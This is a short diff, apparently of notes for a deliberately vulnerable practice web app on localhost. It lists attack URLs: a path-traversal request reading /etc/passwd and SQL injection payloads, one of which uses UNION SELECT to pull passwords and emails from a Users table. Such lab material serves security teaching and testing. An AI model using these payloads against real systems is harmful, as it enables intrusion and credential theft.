@@ -10,7 +10,7 @@ LFI
 http://localhost:3000/get-image?imageName=../../../../../etc/passwd
 
 Various SQLi
-http://localhost:3000/getuser?username=admin%27%20or%20username=%27user%27--%27
+http://localhost:3000/admin/getuser?username=admin%27%20or%20username=%27user%27--%27
 http://localhost:3000/detail?productId=1%20union%20select%20-1,password,%20email,4,5,6%20from%20Users%20order%20by%20productId%20asc
 
 
